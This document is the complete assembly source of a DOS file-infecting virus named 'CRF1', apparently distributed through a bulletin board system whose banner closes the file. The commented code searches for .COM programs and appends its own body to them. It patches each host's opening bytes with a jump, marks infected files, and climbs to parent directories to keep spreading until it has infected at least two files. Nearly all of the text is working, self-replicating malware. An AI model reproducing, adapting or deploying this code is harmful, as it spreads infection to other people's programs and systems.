	title "CRF1 virus.  Born on the Fourth of July.  Written by TBSI."

; assemble with Turbo ASM 2.x
							page 60,80
code segment						word public 'code'
							assume cs:code,ds:code
							org	100h
main proc;edure


; As referenced in this source listing, Top-Of-File represents location 100h in
; the current memory segment, which is where the virus code is loaded into mem.
; The word "program" refers to the infected programs code and "virus" refers to
; the virus's code.  This information is included to clarify my use of the word
; "program" in the remarks throughout this listing.

; Since the virus (with the exception of "call skip" and "db 26") can be loaded
; anywhere in memory depending on the length of the infected program, I made it
; to where the BP register would be loaded with the displacement of the code in
; memory.  This was done as follows:
;             1) a CALL instruction was issued.  It places the TRUE return
;                 address onto the stack.
;             2) instead of returning to there, the value was popped off of
;                 the stack into the BP register
;             3) then, it subtracts the EXPECTED value of BP (the address of
;                 EOFMARK in the 1st-time copy) from BP to get the offset.
;             4) all references to memory locations were thereafter changed
;                 to refernces to EXPECTED memory locations + BP
; This fixed the problem.




tof:							;Top-Of-File
		jmp	short begin			;Skip over program
		nop					;Reserve 3rd byte
EOFMARK:	db	26				;Disable DOS's TYPE

first_four:	nop					;First run copy only!
address:	int	20h				;First run copy only!
check:		nop					;First run copy only!

begin:		call	nextline			;Push BP onto stack
nextline:	pop	bp				;BP=location of Skip
		sub	bp,offset nextline		;BP=offset from 1st run

		mov	byte ptr [bp+offset infected],0	;Reset infection count

		lea	si,[bp+offset first_four]	;Original first 4 bytes
		mov	di,offset tof			;TOF never changes
		mov	cx,4				;Lets copy 4 bytes
		cld					;Read left-to-right
		rep	movsb				;Copy the 4 bytes

		mov	ah,1Ah				;Set DTA address ...
		lea	dx,[bp+offset DTA]		; ... to *our* DTA
		int	21h				;Call DOS to set DTA

		mov	ah,4Eh				;Find First ASCIIZ
		lea	dx,[bp+offset filespec]		;DS:DX -} '*.COM',0
		lea	si,[bp+offset filename]		;Point to file
		push	dx				;Save DX
		jmp	short continue			;Continue...

return:		mov	ah,1ah				;Set DTA address ...
		mov	dx,80h				; ... to default DTA
		int	21h				;Call DOS to set DTA
		xor	ax,ax				;AX= 0
		mov	bx,ax				;BX= 0
		mov	cx,ax				;CX= 0
		mov	dx,ax				;DX= 0
		mov	si,ax				;SI= 0
		mov	di,ax				;DI= 0
		mov	sp,0FFFEh			;SP= 0
		mov	bp,100h				;BP= 100h (RETurn addr)
		push	bp				; Put on stack
		mov	bp,ax				;BP= 0
		ret					;JMP to 100h

nextfile:	or	bx,bx				;Did we open the file?
		jz	skipclose			;No, so don't close it
		mov	ah,3Eh				;Close file
		int	21h				;Call DOS to close it
		xor	bx,bx				;Set BX back to 0
skipclose:	mov	ah,4Fh				;Find Next ASCIIZ

continue:	pop	dx				;Restore DX
		push	dx				;Re-save DX
		xor	cx,cx				;CX= 0
		xor	bx,bx
		int	21h				;Find First/Next
		jnc	skipjmp
		jmp	NoneLeft			;Out of files

skipjmp:	mov	ax,3D02h			;open file
		mov	dx,si				;point to filespec
		int	21h				;Call DOS to open file
		jc	nextfile			;Next file if error

		mov	bx,ax				;get the handle
		mov	ah,3Fh				;Read from file
		mov	cx,4				;Read 4 bytes
		lea	dx,[bp+offset first_four]	;Read in the first 4
		int	21h				;Call DOS to read

		cmp	byte ptr [bp+offset check],26	;Already infected?
		je	nextfile			;Yep, try again ...
		cmp	byte ptr [bp+offset first_four],77  ;Mis-named .EXE?
		je	nextfile			;Yep, maybe next time!

		mov	ax,4202h			;LSeek to EOF
		xor	cx,cx				;CX= 0
		xor	dx,dx				;DX= 0
		int	21h				;Call DOS to LSeek

		cmp	ax,0FD00h			;Longer than 63K?
		ja	nextfile			;Yep, try again...
		mov	[bp+offset addr],ax		;Save call location

		mov	ah,40h				;Write to file
		mov	cx,4				;Write 4 bytes
		lea	dx,[bp+offset first_four]	;Point to buffer
		int	21h				;Save the first 4 bytes

		mov	ah,40h				;Write to file
		mov	cx,offset eof-offset begin	;Length of target code
		lea	dx,[bp+offset begin]		;Point to virus start
		int	21h				;Append the virus

		mov	ax,4200h			;LSeek to TOF
		xor	cx,cx				;CX= 0
		xor	dx,dx				;DX= 0
		int	21h				;Call DOS to LSeek

		mov	ax,[bp+offset addr]		;Retrieve location
		inc	ax				;Adjust location

		mov	[bp+offset address],ax		;address to call
		mov	byte ptr [bp+offset first_four],0E9h  ;JMP rel16 inst.
		mov	byte ptr [bp+offset check],26	;EOFMARK

		mov	ah,40h				;Write to file
		mov	cx,4				;Write 4 bytes
		lea	dx,[bp+offset first_four]	;4 bytes are at [DX]
		int	21h				;Write to file

		inc	byte ptr [bp+offset infected]	;increment counter
		jmp	nextfile			;Any more?

NoneLeft:	cmp	byte ptr [bp+offset infected],2	;At least 2 infected?
		jae	TheEnd				;The party's over!

		mov	di,100h				;DI= 100h
		cmp	word ptr [di],20CDh		;an INT 20h?
		je	TheEnd				;Don't go to prev. dir.

		lea	dx,[bp+offset prevdir]		;'..'
		mov	ah,3Bh				;Set current directory
		int	21h				;CHDIR ..
		jc	TheEnd				;We're through!
		mov	ah,4Eh
		jmp	continue			;Start over in new dir

TheEnd:		jmp	return				;The party's over!

filespec:	db	'*.COM',0			;File specification
prevdir:	db	'..',0				;previous directory

; None of this information is included in the virus's code.  It is only used
; during the search/infect routines and it is not necessary to preserve it
; in between calls to them.

eof:
DTA:		db	21 dup (?)			;internal search's data

attribute	db	?				;attribute
file_time	db	2 dup (?)			;file's time stamp
file_date	db	2 dup (?)			;file's date stamp
file_size	db	4 dup (?)			;file's size
filename	db	13 dup (?)			;filename

infected	db	?				;infection count

addr		dw	?				;Address

							main endp;rocedure
							code ends;egment

			end main

; ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
; This quality file was downloaded from
;
;         E  X  T  R  E  M  E
;      ------------+------------      ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;                 /|\                  ณ                                 ณ
;                / | \                 ณ   Portland Metro All Text BBS   ณ
;               /  |  \                ณ                                 ณ
;              /   |   \               ณ        9600: 503-775-0374       ณ
;             /    |    \              ณ         SysOp: Thing One        ณ
;            /     |     \             ณ                                 ณ
;           /      |      \           ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
;            d r e a m e s
